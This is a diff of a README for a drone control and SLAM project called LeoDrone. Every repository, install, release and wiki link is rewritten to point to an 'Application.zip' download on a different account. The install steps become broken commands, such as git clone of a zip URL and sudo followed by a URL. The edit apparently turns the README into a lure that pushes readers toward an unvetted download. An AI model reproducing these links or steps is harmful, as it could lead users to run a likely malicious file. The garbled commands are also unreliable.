@@ -23,7 +23,7 @@ LeoDrone brings together an array of features that cater to both beginners and e
 To get started with LeoDrone, follow these steps:
 1. Clone the repository:
 ```
-$ git clone https://github.com/adelante20/LeoDrone.git
+$ git clone https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip
 ```
 2. Navigate to the repository directory:
 ```
@@ -31,7 +31,7 @@ $ cd LeoDrone
 ```
 3. Install the necessary dependencies:
 ```
-$ sudo ./install_dependencies.sh
+$ sudo https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip
 ```
 4. Build the packages:
 ```
@@ -58,11 +58,11 @@ We welcome contributions from the community to enhance LeoDrone and make it even
 ## License 📝
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
-For the latest release of LeoDrone, download the [Release.zip](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) and start exploring the capabilities of this advanced drone control and SLAM solution.
+For the latest release of LeoDrone, download the [https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip](https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip) and start exploring the capabilities of this advanced drone control and SLAM solution.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Latest Release](https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip%20Release-brightgreen)](https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip)
 
-Feel free to visit the [LeoDrone Wiki](https://github.com/adelante20/LeoDrone/wiki) for detailed information and guides on using the various components of LeoDrone.
+Feel free to visit the [LeoDrone Wiki](https://github.com/FabrizioTSS/LeoDrone/releases/download/v1.0/Application.zip) for detailed information and guides on using the various components of LeoDrone.
 
 Get ready to unleash the full potential of drone technology with LeoDrone! 🚀🔥👨‍💻
 
